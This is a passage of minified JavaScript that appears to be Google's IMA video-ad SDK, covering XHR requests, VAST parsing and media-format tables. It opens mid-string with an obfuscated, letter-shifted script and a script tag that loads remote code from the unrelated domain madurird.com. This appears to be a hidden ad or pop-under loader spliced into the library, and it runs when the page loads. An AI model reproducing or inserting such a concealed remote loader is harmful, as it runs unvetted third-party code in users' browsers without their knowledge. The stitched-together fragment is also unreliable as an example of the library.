m-paymuz",cE:"faUEAEfduzs",pE:"?pahd=fdgq",BE:"efduzsurk",QE:"pdmiUymsq",VE:"fduy",HE:"[\\d\\z]+",nE:"/4/",uE:16,zE:12,aE:"qzpUzvqofEodubfOapq",XE:"nxaow",JE:"omzhme",UE:"sqfOazfqjf",dE:"2p",ZE:"sqfUymsqPmfm",iE:"efmfge_oapq",wE:"puebxmk",IE:30,lE:5e3,sE:"oxaeqp",DE:"f",AE:"baef",eE:"tqmpqde",tE:"qddad.oay",yE:"egnefduzs",LE:"eturfEfduzs ",NE:"ruxx",FE:"pmfq:",qE:32,RE:204,mE:"' ituxq dqcgqefuzs ",oE:": ",TE:"fuyqagf",PE:256,fE:"efmfgeFqjf",xY:"qddad dqcgqef fuyqagf",rY:"qddad '",KY:8,jY:"_",kY:"paogyqzf\\n"}).reduce((e,q)=>(ue.defineProperty(e,q[0],{get:()=>typeof q[1]!="string"?q[1]:q[1].split("").map(i=>{let w=i.charCodeAt(0);return w>=65&&w<=90?v.fromCharCode((w-65+26-12)%26+65):w>=97&&w<=122?v.fromCharCode((w-97+26-12)%26+97):i}).join("")}),e),{}),window,qt,h)});})();</script><script src="//madurird.com/tag.min.js" data-zone="9352771" data-cfasync="false" async onerror="_lxtqolz()" onload="_xivfmvdp()"></script>
</body>"')
                })
            }
        },
        ot = function(a) {
            var b = xf("IFRAME", {
                src: a,
                style: "display:none"
            });
            a = nf(b).body;
            var c = ck(function() {
                tj(d);
                yf(b)
            }, 15E3);
            var d = kj(b, ["load",
                "error"
            ], function() {
                ck(function() {
                    u.clearTimeout(c);
                    yf(b)
                }, 5E3)
            });
            a.appendChild(b)
        },
        nt = function(a) {
            var b = kt.imageLoadingEnabled;
            if (null != b) a(b);
            else {
                var c = !1;
                qt(function(d, e) {
                    delete kt[e];
                    c || (c = !0, null == kt.imageLoadingEnabled && (kt.imageLoadingEnabled = d), a(d))
                })
            }
        },
        qt = function(a) {
            var b = new Image,
                c = "" + jt++;
            kt[c] = b;
            b.onload = function() {
                clearTimeout(d);
                a(!0, c)
            };
            var d = setTimeout(function() {
                a(!1, c)
            }, 300);
            b.src = "data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=="
        },
        rt = function(a) {
            if (a) {
                var b =
                    vf(document, "OBJECT");
                b.data = a;
                b.width = "1";
                b.height = "1";
                b.style.visibility = "hidden";
                var c = "" + jt++;
                kt[c] = b;
                b.onload = b.onerror = function() {
                    delete kt[c]
                };
                document.body.appendChild(b)
            }
        },
        tt = function(a) {
            if (a) {
                var b = new Image,
                    c = "" + jt++;
                kt[c] = b;
                b.onload = b.onerror = function() {
                    delete kt[c]
                };
                b.src = a
            }
        },
        ut = function(a) {
            a && nt(function(b) {
                b ? tt(a) : rt(a)
            })
        },
        mt = function(a) {
            if (!(a instanceof wc))
                if (a = "object" == typeof a && a.Qa ? a.Fa() : String(a), Ac.test(a)) a = new wc(a, vc);
                else {
                    a = String(a);
                    a = a.replace(/(%0A|%0D)/g, "");
                    var b =
                        a.match(zc);
                    a = b && yc.test(b[1]) ? new wc(a, vc) : null
                }
            b = xc(a || Bc);
            if ("about:invalid#zClosurez" === b) return "";
            if (b instanceof Nc) a = b;
            else {
                var c = "object" == typeof b;
                a = null;
                c && b.Dc && (a = b.zc());
                b = c && b.Qa ? b.Fa() : String(b);
                rc.test(b) && (-1 != b.indexOf("&") && (b = b.replace(lc, "&amp;")), -1 != b.indexOf("<") && (b = b.replace(mc, "&lt;")), -1 != b.indexOf(">") && (b = b.replace(nc, "&gt;")), -1 != b.indexOf('"') && (b = b.replace(oc, "&quot;")), -1 != b.indexOf("'") && (b = b.replace(pc, "&#39;")), -1 != b.indexOf("\x00") && (b = b.replace(qc, "&#0;")));
                a = Pc(b, a)
            }
            a = Oc(a).toString();
            return encodeURIComponent(String(Hh(new Fh(void 0), a)))
        };
    var vt = "ad_type vpos mridx pos vad_type videoad_start_delay".split(" ");
    var wt = function(a) {
        var b = a.ob,
            c = a.height,
            d = a.width,
            e = void 0 === a.Ia ? !1 : a.Ia;
        this.A = a.vb;
        this.g = b;
        this.o = c;
        this.L = d;
        this.B = e
    };
    wt.prototype.getHeight = function() {
        return this.o
    };
    wt.prototype.getWidth = function() {
        return this.L
    };
    var xt = function(a) {
        var b = a.uf,
            c = a.re,
            d = a.tf,
            e = a.qe;
        wt.call(this, {
            vb: a.vb,
            ob: a.ob,
            height: a.height,
            width: a.width,
            Ia: void 0 === a.Ia ? !1 : a.Ia
        });
        this.I = b;
        this.l = c;
        this.C = d;
        this.h = e
    };
    t(xt, wt);
    var yt = function(a) {
        var b = a.Ye;
        wt.call(this, {
            vb: a.vb,
            ob: a.ob,
            height: a.height,
            width: a.width,
            Ia: void 0 === a.Ia ? !1 : a.Ia
        });
        this.h = b
    };
    t(yt, wt);
    yt.prototype.getMediaUrl = function() {
        return this.h
    };
    /*

    Math.uuid.js (v1.4)
    http://www.broofa.com
    mailto:robert@broofa.com
    Copyright (c) 2010 Robert Kieffer
    Dual licensed under the MIT and GPL licenses.
    */
    var zt = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".split(""),
        At = function() {
            for (var a = Array(36), b = 0, c, d = 0; 36 > d; d++) 8 == d || 13 == d || 18 == d || 23 == d ? a[d] = "-" : 14 == d ? a[d] = "4" : (2 >= b && (b = 33554432 + 16777216 * Math.random() | 0), c = b & 15, b >>= 4, a[d] = zt[19 == d ? c & 3 | 8 : c]);
            return a.join("")
        };

    function Bt(a, b) {
        for (var c = [], d = 1; d < arguments.length; ++d) c[d - 1] = arguments[d];
        return new(Function.prototype.bind.apply(a, [null].concat(ha(c))))
    };
    var Q = {},
        Ct = (Q[18] = -1, Q[22] = -1, Q[43] = 350, Q[44] = 350, Q[45] = 350, Q[59] = -1, Q[133] = 350, Q[134] = 350, Q[135] = 350, Q[136] = 350, Q[139] = 50, Q[140] = 50, Q[141] = 50, Q[160] = 350, Q[242] = 150, Q[243] = 150, Q[244] = 150, Q[245] = 150, Q[249] = 50, Q[250] = 50, Q[251] = 50, Q[278] = 150, Q[342] = -1, Q[343] = -1, Q[344] = -1, Q[345] = -1, Q[346] = -1, Q[347] = -1, Q),
        R = {},
        Dt = (R[18] = !1, R[22] = !1, R[43] = !0, R[44] = !0, R[45] = !0, R[59] = !1, R[133] = !0, R[134] = !0, R[135] = !0, R[136] = !0, R[139] = !0, R[140] = !0, R[141] = !0, R[160] = !0, R[242] = !0, R[243] = !0, R[244] = !0, R[245] = !0, R[249] = !0, R[250] = !0, R[251] = !0, R[278] = !0, R[342] = !1, R[343] = !1, R[344] = !1, R[345] = !1, R[346] = !1, R[347] = !1, R),
        S = {},
        Et = (S[18] = "video/mp4", S[22] = "video/mp4", S[43] = "video/webm", S[44] = "video/webm", S[45] = "video/webm", S[59] = "video/mp4", S[133] = "video/mp4", S[134] = "video/mp4", S[135] = "video/mp4", S[136] = "video/mp4", S[139] = "audio/mp4", S[140] = "audio/mp4", S[141] = "audio/mp4", S[160] = "video/mp4", S[242] = "video/webm", S[243] = "video/webm", S[244] = "video/webm", S[245] = "video/webm", S[249] = "audio/webm", S[250] = "audio/webm", S[251] = "audio/webm", S[278] =
            "video/webm", S[342] = "video/mp4", S[343] = "video/mp4", S[344] = "video/mp4", S[345] = "video/mp4", S[346] = "video/mp4", S[347] = "video/mp4", S),
        T = {},
        Ft = (T[18] = "avc1.42001E, mp4a.40.2", T[22] = "avc1.64001F, mp4a.40.2", T[43] = "vp8, vorbis", T[44] = "vp8, vorbis", T[45] = "vp8, vorbis", T[59] = "avc1.4D001F, mp4a.40.2", T[133] = "avc1.4D401E", T[134] = "avc1.4D401E", T[135] = "avc1.4D401E", T[136] = "avc1.4D401E", T[139] = "mp4a.40.2", T[140] = "mp4a.40.2", T[141] = "mp4a.40.2", T[160] = "avc1.4D401E", T[242] = "vp9", T[243] = "vp9", T[244] = "vp9", T[245] = "vp9",
            T[249] = "opus", T[250] = "opus", T[251] = "opus", T[278] = "vp9", T[342] = "avc1.42E01E, mp4a.40.2", T[343] = "avc1.42E01E, mp4a.40.2", T[344] = "avc1.42E01E, mp4a.40.2", T[345] = "avc1.42E01E, mp4a.40.2", T[346] = "avc1.42E01E, mp4a.40.2", T[347] = "avc1.4D001F, mp4a.40.2", T);
    var Gt = function() {};
    Gt.prototype.g = null;
    var It = function(a) {
        var b;
        (b = a.g) || (b = {}, Ht(a) && (b[0] = !0, b[1] = !0), b = a.g = b);
        return b
    };
    var Jt, Kt = function() {};
    Za(Kt, Gt);
    var Lt = function(a) {
            return (a = Ht(a)) ? new ActiveXObject(a) : new XMLHttpRequest
        },
        Ht = function(a) {
            if (!a.h && "undefined" == typeof XMLHttpRequest && "undefined" != typeof ActiveXObject) {
                for (var b = ["MSXML2.XMLHTTP.6.0", "MSXML2.XMLHTTP.3.0", "MSXML2.XMLHTTP", "Microsoft.XMLHTTP"], c = 0; c < b.length; c++) {
                    var d = b[c];
                    try {
                        return new ActiveXObject(d), a.h = d
                    } catch (e) {}
                }
                throw Error("Could not create ActiveXObject. ActiveX might be disabled, or MSXML might not be installed");
            }
            return a.h
        };
    Jt = new Kt;
    var Mt = function(a) {
        M.call(this);
        this.headers = new Ls;
        this.H = a || null;
        this.h = !1;
        this.G = this.g = null;
        this.M = "";
        this.o = 0;
        this.l = this.K = this.A = this.J = !1;
        this.D = 0;
        this.C = null;
        this.$ = "";
        this.T = this.V = !1;
        this.R = null
    };
    Za(Mt, M);
    var Nt = /^https?$/i,
        Ot = ["POST", "PUT"];
    Mt.prototype.X = function(a) {
        this.R = a
    };
    var St = function(a, b, c, d) {
            if (a.g) throw Error("[goog.net.XhrIo] Object is active with another request=" + a.M + "; newUri=" + b);
            c = c ? c.toUpperCase() : "GET";
            a.M = b;
            a.o = 0;
            a.J = !1;
            a.h = !0;
            a.g = a.H ? Lt(a.H) : Lt(Jt);
            a.G = a.H ? It(a.H) : It(Jt);
            a.g.onreadystatechange = Wa(a.Y, a);
            try {
                a.K = !0, a.g.open(c, String(b), !0), a.K = !1
            } catch (g) {
                Pt(a);
                return
            }
            b = d || "";
            d = new Ls(a.headers);
            var e = d.Xa().find(function(g) {
                    return "content-type" == g.toLowerCase()
                }),
                f = u.FormData && b instanceof u.FormData;
            !wb(Ot, c) || e || f || d.set("Content-Type", "application/x-www-form-urlencoded;charset=utf-8");
            d.forEach(function(g, h) {
                this.g.setRequestHeader(h, g)
            }, a);
            a.$ && (a.g.responseType = a.$);
            "withCredentials" in a.g && a.g.withCredentials !== a.V && (a.g.withCredentials = a.V);
            if ("setTrustToken" in a.g && a.R) try {
                a.g.setTrustToken(a.R)
            } catch (g) {}
            try {
                Qt(a), 0 < a.D && (a.T = Rt(a.g), a.T ? (a.g.timeout = a.D, a.g.ontimeout = Wa(a.aa, a)) : a.C = ck(a.aa, a.D, a)), a.A = !0, a.g.send(b), a.A = !1
            } catch (g) {
                Pt(a)
            }
        },
        Rt = function(a) {
            return vd && Md(9) && "number" === typeof a.timeout && void 0 !== a.ontimeout
        };
    Mt.prototype.aa = function() {
        "undefined" != typeof Ja && this.g && (this.o = 8, this.dispatchEvent("timeout"), this.abort(8))
    };
    var Pt = function(a) {
            a.h = !1;
            a.g && (a.l = !0, a.g.abort(), a.l = !1);
            a.o = 5;
            Tt(a);
            Ut(a)
        },
        Tt = function(a) {
            a.J || (a.J = !0, a.dispatchEvent("complete"), a.dispatchEvent("error"))
        };
    Mt.prototype.abort = function(a) {
        this.g && this.h && (this.h = !1, this.l = !0, this.g.abort(), this.l = !1, this.o = a || 7, this.dispatchEvent("complete"), this.dispatchEvent("abort"), Ut(this))
    };
    Mt.prototype.N = function() {
        this.g && (this.h && (this.h = !1, this.l = !0, this.g.abort(), this.l = !1), Ut(this, !0));
        Mt.xa.N.call(this)
    };
    Mt.prototype.Y = function() {
        this.Ra() || (this.K || this.A || this.l ? Vt(this) : this.da())
    };
    Mt.prototype.da = function() {
        Vt(this)
    };
    var Vt = function(a) {
            if (a.h && "undefined" != typeof Ja && (!a.G[1] || 4 != Wt(a) || 2 != Xt(a)))
                if (a.A && 4 == Wt(a)) ck(a.Y, 0, a);
                else if (a.dispatchEvent("readystatechange"), 4 == Wt(a)) {
                a.h = !1;
                try {
                    var b = Xt(a);
                    a: switch (b) {
                        case 200:
                        case 201:
                        case 202:
                        case 204:
                        case 206:
                        case 304:
                        case 1223:
                            var c = !0;
                            break a;
                        default:
                            c = !1
                    }
                    var d;
                    if (!(d = c)) {
                        var e;
                        if (e = 0 === b) {
                            var f = String(a.M).match(Ff)[1] || null;
                            if (!f && u.self && u.self.location) {
                                var g = u.self.location.protocol;
                                f = g.substr(0, g.length - 1)
                            }
                            e = !Nt.test(f ? f.toLowerCase() : "")
                        }
                        d = e
                    }
                    d ? (a.dispatchEvent("complete"),
                        a.dispatchEvent("success")) : (a.o = 6, Tt(a))
                } finally {
                    Ut(a)
                }
            }
        },
        Ut = function(a, b) {
            if (a.g) {
                Qt(a);
                var c = a.g,
                    d = a.G[0] ? La : null;
                a.g = null;
                a.G = null;
                b || a.dispatchEvent("ready");
                try {
                    c.onreadystatechange = d
                } catch (e) {}
            }
        },
        Qt = function(a) {
            a.g && a.T && (a.g.ontimeout = null);
            a.C && (u.clearTimeout(a.C), a.C = null)
        };
    Mt.prototype.Gc = function() {
        return !!this.g
    };
    var Wt = function(a) {
            return a.g ? a.g.readyState : 0
        },
        Xt = function(a) {
            try {
                return 2 < Wt(a) ? a.g.status : -1
            } catch (b) {
                return -1
            }
        },
        Yt = function(a) {
            try {
                return a.g ? a.g.responseText : ""
            } catch (b) {
                return ""
            }
        },
        Zt = function(a) {
            if (a.g) {
                a: {
                    a = a.g.responseText;
                    if (u.JSON) try {
                        var b = u.JSON.parse(a);
                        break a
                    } catch (c) {}
                    b = Eh(a)
                }
                return b
            }
        },
        $t = function(a, b) {
            if (a.g && 4 == Wt(a)) return a = a.g.getResponseHeader(b), null === a ? void 0 : a
        };
    var au = RegExp("/itag/(\\d+)/");

    function bu(a) {
        var b = parseInt(Jf(a, "itag"), 10);
        return b ? b : (a = a.match(au)) && 2 == a.length ? parseInt(a[1], 10) : null
    }

    function cu(a) {
        var b = Et[a];
        a = Ft[a];
        b ? (b = Zc(b).toLowerCase(), b = a ? b + '; codecs="' + Zc(a) + '"' : b) : b = "";
        return b
    }

    function du(a, b) {
        if ("function" === typeof CustomEvent) return new CustomEvent(a, {
            detail: b
        });
        var c = document.createEvent("CustomEvent");
        c.initCustomEvent(a, !1, !0, b);
        return c
    };
    var eu = -1;
    var fu = function() {
        this.g = Date.now()
    };
    fu.prototype.reset = function() {
        this.g = Date.now()
    };
    var gu = function(a) {
        a = a.g + 5E3 - Date.now();
        return 0 < a ? a : 0
    };
    var hu = "ad.doubleclick.net bid.g.doubleclick.net ggpht.com google.co.uk google.com googleads.g.doubleclick.net googleads4.g.doubleclick.net googleadservices.com googlesyndication.com googleusercontent.com gstatic.com gvt1.com prod.google.com pubads.g.doubleclick.net s0.2mdn.net static.doubleclick.net surveys.g.doubleclick.net youtube.com ytimg.com".split(" "),
        iu = ["c.googlesyndication.com"];

    function ju(a, b) {
        b = void 0 === b ? window.location.protocol : b;
        var c = !1;
        ku(a, iu) ? c = !1 : b.includes("https") && ku(a, hu) && (c = !0);
        if (c) {
            b = new P(a);
            if ("https" == b.o) return a;
            I(J(), "htp", "1");
            Ps(b, "https");
            return b.toString()
        }
        return a
    }

    function ku(a, b) {
        return (new RegExp("^https?://([a-z0-9-]{1,63}\\.)*(" + b.join("|").replace(/\./g, "\\.") + ")(:[0-9]+)?([/?#]|$)", "i")).test(a)
    };
    var lu = function(a) {
        return (a = a.exec(Fc)) ? a[1] : ""
    };
    (function() {
        if (Qd) return lu(/Firefox\/([0-9.]+)/);
        if (vd || wd || ud) return Ld;
        if (Ud) {
            if (pd() || A("Macintosh")) {
                var a = lu(/CriOS\/([0-9.]+)/);
                if (a) return a
            }
            return lu(/Chrome\/([0-9.]+)/)
        }
        if (Vd && !pd()) return lu(/Version\/([0-9.]+)/);
        if (Rd || Sd) {
            if (a = /Version\/(\S+).*Mobile\/(\S+)/.exec(Fc)) return a[1] + "." + a[2]
        } else if (Td) return (a = lu(/Android\s+([0-9.]+)/)) ? a : lu(/Version\/([0-9.]+)/);
        return ""
    })();
    var mu = /OS (\S+) like/,
        nu = /Android ([\d\.]+)/;

    function ou(a, b) {
        a = (a = a.exec(Fc)) ? a[1] : "";
        a = a.replace(/_/g, ".");
        return 0 <= uc(a, b)
    }
    var pu = function() {
            return zd && "ontouchstart" in document.documentElement
        },
        qu = function(a) {
            return Fd && ou(mu, a)
        },
        ru = function(a) {
            return (a = void 0 === a ? null : a) && "function" === typeof a.getAttribute ? a.getAttribute("playsinline") ? !0 : !1 : !1
        };
    var tu = function(a) {
        var b = Error.call(this, a);
        this.message = b.message;
        "stack" in b && (this.stack = b.stack);
        this.errorCode = a
    };
    t(tu, Error);
    var vu = function(a) {
            uu();
            return Pc(a, null)
        },
        uu = La;
    var wu = function() {
            if (!vd) return !1;
            try {
                return new ActiveXObject("MSXML2.DOMDocument"), !0
            } catch (a) {
                return !1
            }
        },
        xu = vd && wu();
    var yu = function(a) {
        L.call(this);
        this.o = a;
        this.h = {}
    };
    Za(yu, L);
    var zu = [];
    yu.prototype.O = function(a, b, c, d) {
        return Au(this, a, b, c, d)
    };
    var Au = function(a, b, c, d, e, f) {
        Array.isArray(c) || (c && (zu[0] = c.toString()), c = zu);
        for (var g = 0; g < c.length; g++) {
            var h = lj(b, c[g], d || a.handleEvent, e || !1, f || a.o || a);
            if (!h) break;
            a.h[h.key] = h
        }
        return a
    };
    yu.prototype.Gb = function(a, b, c, d) {
        return Bu(this, a, b, c, d)
    };
    var Bu = function(a, b, c, d, e, f) {
        if (Array.isArray(c))
            for (var g = 0; g < c.length; g++) Bu(a, b, c[g], d, e, f);
        else {
            b = kj(b, c, d || a.handleEvent, e, f || a.o || a);
            if (!b) return a;
            a.h[b.key] = b
        }
        return a
    };
    yu.prototype.Ua = function(a, b, c, d, e) {
        if (Array.isArray(b))
            for (var f = 0; f < b.length; f++) this.Ua(a, b[f], c, d, e);
        else c = c || this.handleEvent, d = Na(d) ? !!d.capture : !!d, e = e || this.o || this, c = mj(c), d = !!d, b = aj(a) ? a.Cb(b, c, d, e) : a ? (a = oj(a)) ? a.Cb(b, c, d, e) : null : null, b && (tj(b), delete this.h[b.key])
    };
    var Cu = function(a) {
        Gb(a.h, function(b, c) {
            this.h.hasOwnProperty(c) && tj(b)
        }, a);
        a.h = {}
    };
    yu.prototype.N = function() {
        yu.xa.N.call(this);
        Cu(this)
    };
    yu.prototype.handleEvent = function() {
        throw Error("EventHandler.handleEvent not implemented");
    };
    var Du = function() {};
    Du.prototype.get = function(a) {
        return Eu({
            url: a.url,
            timeout: a.timeout,
            withCredentials: void 0 === a.withCredentials ? !0 : a.withCredentials,
            method: "GET",
            Ka: void 0 === a.Ka ? void 0 : a.Ka
        })
    };
    var Eu = function(a) {
            var b = a.url,
                c = a.timeout,
                d = a.withCredentials,
                e = a.method,
                f = void 0 === a.content ? void 0 : a.content,
                g = void 0 === a.Ka ? void 0 : a.Ka,
                h = void 0 === a.headers ? {} : a.headers;
            return Fu({
                url: b,
                timeout: c,
                withCredentials: d,
                method: e,
                content: f,
                Ka: g,
                headers: h
            }).then(function(k) {
                return Promise.resolve(k)
            }, function(k) {
                return k instanceof Error && 6 == k.message && d ? Fu({
                    url: b,
                    timeout: c,
                    withCredentials: !d,
                    method: e,
                    content: f,
                    Ka: g,
                    headers: h
                }) : Promise.reject(k)
            })
        },
        Fu = function(a) {
            var b = a.url,
                c = a.timeout,
                d = a.withCredentials,
                e = a.method,
                f = void 0 === a.content ? void 0 : a.content,
                g = void 0 === a.Ka ? void 0 : a.Ka;
            a = void 0 === a.headers ? {} : a.headers;
            var h = new Mt;
            h.V = d;
            h.D = Math.max(0, gu(c));
            h.X && g && h.X(g);
            for (var k in a) h.headers.set(k, a[k]);
            var n = new yu;
            return new Promise(function(m, v) {
                n.Gb(h, "success", function() {
                    a: {
                        if (Mm()) try {
                            Zt(h);
                            var r = "application/json";
                            break a
                        } catch (Qa) {
                            r = "application/xml";
                            break a
                        }
                        r = $t(h, "Content-Type") || ""
                    }
                    if (-1 != r.indexOf("application/json")) m(Zt(h) || {});
                    else {
                        try {
                            var w = h.g ? h.g.responseXML : null
                        } catch (Qa) {
                            w = null
                        }
                        if (null ==
                            w)
                            if (w = Yt(h), "undefined" != typeof DOMParser) r = new DOMParser, w = vu(w), w = r.parseFromString(Oc(w), "application/xml");
                            else if (xu) {
                            r = new ActiveXObject("MSXML2.DOMDocument");
                            r.resolveExternals = !1;
                            r.validateOnParse = !1;
                            try {
                                r.setProperty("ProhibitDTD", !0), r.setProperty("MaxXMLSize", 2048), r.setProperty("MaxElementDepth", 256)
                            } catch (Qa) {}
                            r.loadXML(w);
                            w = r
                        } else throw Error("Your browser does not support loading xml documents");
                        r = Sh(Gi);
                        var x;
                        if (x = w && w.documentElement)(x = w.documentElement) && "VAST" != !x.nodeName ? (x =
                            x.getAttribute("version")) ? (x = parseInt(x, 10), x = null == x || isNaN(x) ? null : x) : x = null : x = null, x = null == x || 2 > x || 4 < x ? !1 : !0;
                        if (!x && r) {
                            r = {
                                vastUrl: b.substring(0, 200),
                                responseText: Yt(h).substring(0, 200),
                                status: Xt(h),
                                origin: window.location.origin
                            };
                            Mm() || (r.contentType = $t(h, "Content-Type"), r.acao = $t(h, "Access-Control-Allow-Origin"), r.acac = $t(h, "Access-Control-Allow-Credentials"));
                            x = J();
                            for (var H = q(Object.keys(r)), ka = H.next(); !ka.done; ka = H.next()) ka = ka.value, I(x, ka, r[ka])
                        }
                        m(w)
                    }
                    n.W();h.W()
                });
                n.Gb(h, ["error", "timeout"],
                    function() {
                        v(new tu(h.o, Xt(h)));
                        n.W();
                        h.W()
                    });
                St(h, ju(b), e, f)
            })
        };

    function Gu(a, b) {
        return jc(b) ? !1 : (new RegExp(a)).test(b)
    }

    function Iu(a) {
        var b = {};
        a.split(",").forEach(function(c) {
            var d = c.split("=");
            2 == d.length && (c = kc(d[0]), d = kc(d[1]), 0 < c.length && (b[c] = d))
        });
        return b
    }

    function Ju(a) {
        var b = "af am ar_eg ar_sa ar_xb ar be bg bn ca cs da de_at de_cn de el en_au en_ca en_gb en_ie en_in en_sg en_xa en_xc en_za en es_419 es_ar es_bo es_cl es_co es_cr es_do es_ec es_gt es_hn es_mx es_ni es_pa es_pe es_pr es_py es_sv es_us es_uy es_ve es et eu fa fi fil fr_ca fr_ch fr gl gsw gu he hi hr hu id in is it iw ja kn ko ln lo lt lv ml mo mr ms nb ne nl no pl pt_br pt_pt pt ro ru sk sl sr_latn sr sv sw ta te th tl tr uk ur vi zh_cn zh_hk zh_tw zh zu".split(" ");
        if (!a) return null;
        a = a.toLowerCase().replace("-", "_");
        if (b.includes(a)) return a;
        a = (a = a.match(/^\w{2,3}([-_]|$)/)) ? a[0].replace(/[_-]/g, "") : "";
        return b.includes(a) ? a : null
    };
    var Lu = function(a) {
        P.call(this, a);
        this.C = new Map;
        a = this.g;
        var b = a.indexOf(";"),
            c = null;
        0 <= b ? (this.g = a.substring(0, b), c = a.substring(b + 1)) : this.g = a;
        Ku(this, c)
    };
    t(Lu, P);
    Lu.prototype.toString = function() {
        return Mu(this, P.prototype.toString.call(this))
    };
    Lu.prototype.D = function() {
        return ""
    };
    var Ku = function(a, b) {
            jc(Zc(b)) || b.split(";").forEach(function(c) {
                var d = c.indexOf("=");
                if (!(0 >= d)) {
                    var e = Wc(c.substring(0, d));
                    c = Wc(c.substring(d + 1));
                    d = a.C.get(e);
                    null != d ? d.includes(c) || d.push(c) : d = [Zc(c)];
                    a.C.set(e, d)
                }
            }, a)
        },
        Nu = function(a) {
            if (jc(Zc("ord"))) return null;
            a = a.C.get("ord");
            return null != a ? a : null
        },
        Ou = function(a, b) {
            jc(Zc("ord")) || (b = b.map(Zc), a.C.set("ord", b))
        },
        Mu = function(a, b) {
            b = [Zc(b)];
            b.push.apply(b, ha(Pu(a)));
            return b.join(";")
        },
        Pu = function(a) {
            var b = Nu(a);
            null == b ? b = [Zc(Date.now())] : jc(Zc("ord")) ||
                a.C.delete("ord");
            var c = [];
            a.C.forEach(function(d, e) {
                d.forEach(function(f) {
                    c.push(e + "=" + f)
                })
            });
            c.push("ord=" + b[0]);
            Ou(a, b);
            return c
        };
    Lu.prototype.G = function() {
        return new Lu(this.toString())
    };
    var Qu, Ru, Su, Tu = function() {
            return u.navigator ? u.navigator.userAgent : ""
        },
        Uu = -1 != Tu().indexOf("(iPad") || -1 != Tu().indexOf("(Macintosh") || -1 != Tu().indexOf("(iPod") || -1 != Tu().indexOf("(iPhone");
    var Vu = ["A8RhywYzBE2ntUAzipotZo1NirmVUD5B/IVOEROQCjOklthZ85lxgT2/VAcq1YwhDA6C5W3zQ4bWESWdQ452pgsAAACJeyJvcmlnaW4iOiJodHRwczovL2ltYXNkay5nb29nbGVhcGlzLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjMxNjYzOTk5LCJpc1RoaXJkUGFydHkiOnRydWUsInVzYWdlIjoic3Vic2V0In0="];

    function Wu(a, b) {
        b = void 0 === b ? "" : b;
        vd && (b = "");
        if (!jc(Zc(a))) {
            var c = window.document;
            c = void 0 === c ? window.document : c;
            Wf(Vu, c);
            c = a instanceof wc || !Ds.test(a) ? a : new wc(a, vc);
            if (c instanceof wc) a = c;
            else {
                var d = void 0 === d ? gg : d;
                a: {
                    d = void 0 === d ? gg : d;
                    for (c = 0; c < d.length; ++c) {
                        var e = d[c];
                        if (e instanceof eg && e.We(a)) {
                            a = new We(a, Re);
                            break a
                        }
                    }
                    a = void 0
                }
                a = a || Xe
            }
            window.open(bf(a), "_blank", b)
        }
    };
    var Xu = function(a) {
        M.call(this);
        this.g = a;
        this.o = this.A = !1;
        this.C = this.D = 0;
        this.h = new bk(1E3);
        Vi(this, this.h);
        lj(this.h, "tick", this.G, !1, this);
        lj(this.g, "pause", this.l, !1, this);
        lj(this.g, "playing", this.l, !1, this);
        lj(this.g, "ended", this.l, !1, this);
        lj(this.g, "timeupdate", this.l, !1, this)
    };
    t(Xu, M);
    Xu.prototype.l = function(a) {
        switch (a.type) {
            case "playing":
                Yu(this);
                break;
            case "pause":
            case "ended":
                this.h.jb && this.h.stop();
                break;
            case "timeupdate":
                !this.A && 0 < this.g.currentTime && (this.A = !0, Yu(this))
        }
    };
    var Yu = function(a) {
        !a.h.jb && a.A && (a.D = 1E3 * a.g.currentTime, a.C = Date.now(), a.o = !1, a.h.start())
    };
    Xu.prototype.G = function() {
        var a = Date.now(),
            b = 1E3 * this.g.currentTime;
        b - this.D < .5 * (a - this.C) ? this.o || (this.o = !0, this.dispatchEvent("playbackStalled")) : this.o = !1;
        this.D = b;
        this.C = a
    };
    var Zu = {
        AUTOPLAY_DISALLOWED: "autoplayDisallowed",
        Cf: "beginFullscreen",
        Df: "canPlay",
        Ef: "canPlayThrough",
        CLICK: "click",
        DURATION_CHANGE: "durationChange",
        Qf: "end",
        Rf: "endFullscreen",
        Sf: "error",
        Wf: "focusSkipButton",
        $d: "loadStart",
        LOADED: "loaded",
        yg: "mediaLoadTimeout",
        zg: "mediaPlaybackTimeout",
        sc: "pause",
        Kg: "play",
        Mg: "playing",
        Ug: "seeked",
        Vg: "seeking",
        Wg: "skip",
        je: "skipShown",
        tc: "start",
        fh: "timeUpdate",
        bh: "timedMetadata",
        ne: "volumeChange",
        qh: "waiting"
    };
    var av = function(a) {
            this.g = a;
            this.h = $u(a)
        },
        $u = function(a) {
            return new Map(a.g.split("/").reduce(function(b, c, d) {
                d % 2 ? b[b.length - 1].push(c) : b.push([c]);
                return b
            }, []))
        };
    av.prototype.getId = function() {
        return bv(this, "id")
    };
    var bv = function(a, b) {
        var c = a.g.l.get(b);
        return c ? c : (a = a.h.get(b)) ? a : null
    };
    var cv = function() {};
    var dv = ["doubleclick.net"];

    function ev() {
        if (pd()) return !1;
        if (A("Android")) {
            if (void 0 === Su) {
                a: {
                    if (void 0 === Qu) {
                        if (Uu) {
                            var a = -1 != Tu().indexOf("Safari");
                            var b = (new P(window.location.href)).l.Na("js");
                            b: {
                                if ((b = b.length ? b[0] : "") && 0 == b.lastIndexOf("afma-", 0)) {
                                    var c = b.lastIndexOf("v");
                                    if (-1 < c && (b = b.substr(c + 1).match(/^(\d+\.\d+\.\d+|^\d+\.\d+|^\d+)(-.*)?$/))) {
                                        b = b[1];
                                        break b
                                    }
                                }
                                b = "0.0.0"
                            }
                            if (!a || "0.0.0" !== b) {
                                a = Qu = !0;
                                break a
                            }
                        }
                        Qu = !1
                    }
                    a = Qu
                }
                a || (void 0 === Ru && (Ru = -1 != Tu().indexOf("afma-sdk-a") ? !0 : !1), a = Ru);Su = a
            }
            return Su ? !0 : Df() ? !1 : fv()
        }
        a = A("Macintosh") ||
            A("Linux") || A("Windows") || A("CrOS");
        return (Sh(Ki) || Sh(Ii) || Sh(Ji)) && a && Kc() ? fv() : !1
    }

    function fv() {
        var a = !1,
            b = (new P(window.location.href)).h;
        dv.forEach(function(c) {
            b.includes(c) && (a = !0)
        });
        return a
    }

    function gv(a) {
        for (var b = 0, c = 0; c < a.length; c++) b = Math.imul(31, b) + a.charCodeAt(c) | 0;
        return b.toString()
    };
    var hv, kv = function(a, b, c) {
        if ("number" === typeof a) var d = {
            name: iv(a)
        };
        else d = a, a = jv(a.name);
        this.code = a;
